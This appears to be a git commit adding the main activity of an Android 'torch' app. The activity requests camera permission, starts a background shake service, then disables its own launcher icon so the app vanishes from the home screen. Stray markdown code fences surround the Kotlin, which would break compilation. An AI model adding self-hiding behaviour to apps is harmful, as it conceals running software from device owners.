27b0fcba26f78247fd811757278fa69ef56a88df
DEV <devendar87502@gmail.com>
2026-05-28 22:52:38 +0530

    Create MainActivity.kt

---
+++ app/src/main/java/com/magic/torch/MainActivity.kt
@@ -0,0 +1,86 @@
+```kotlin id="6rmbn5"
+package com.magic.torch
+
+import android.Manifest
+import android.content.ComponentName
+import android.content.Intent
+import android.content.pm.PackageManager
+import android.os.Build
+import android.os.Bundle
+import androidx.appcompat.app.AppCompatActivity
+import androidx.core.app.ActivityCompat
+import androidx.core.content.ContextCompat
+
+class MainActivity : AppCompatActivity() {
+
+    private val permissions = arrayOf(
+        Manifest.permission.CAMERA
+    )
+
+    override fun onCreate(savedInstanceState: Bundle?) {
+        super.onCreate(savedInstanceState)
+
+        setContentView(R.layout.activity_main)
+
+        if (!hasPermissions()) {
+            ActivityCompat.requestPermissions(
+                this,
+                permissions,
+                100
+            )
+        } else {
+            startTorchService()
+        }
+    }
+
+    private fun hasPermissions(): Boolean {
+
+        return permissions.all {
+            ContextCompat.checkSelfPermission(
+                this,
+                it
+            ) == PackageManager.PERMISSION_GRANTED
+        }
+    }
+
+    override fun onRequestPermissionsResult(
+        requestCode: Int,
+        permissions: Array<out String>,
+        grantResults: IntArray
+    ) {
+        super.onRequestPermissionsResult(
+            requestCode,
+            permissions,
+            grantResults
+        )
+
+        if (requestCode == 100) {
+            startTorchService()
+        }
+    }
+
+    private fun startTorchService() {
+
+        val intent = Intent(this, ShakeService::class.java)
+
+        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
+            startForegroundService(intent)
+        } else {
+            startService(intent)
+        }
+
+        hideLauncherIcon()
+
+        finish()
+    }
+
+    private fun hideLauncherIcon() {
+
+        packageManager.setComponentEnabledSetting(
+            ComponentName(this, MainActivity::class.java),
+            PackageManager.COMPONENT_ENABLED_STATE_DISABLED,
+            PackageManager.DONT_KILL_APP
+        )
+    }
+}
+```
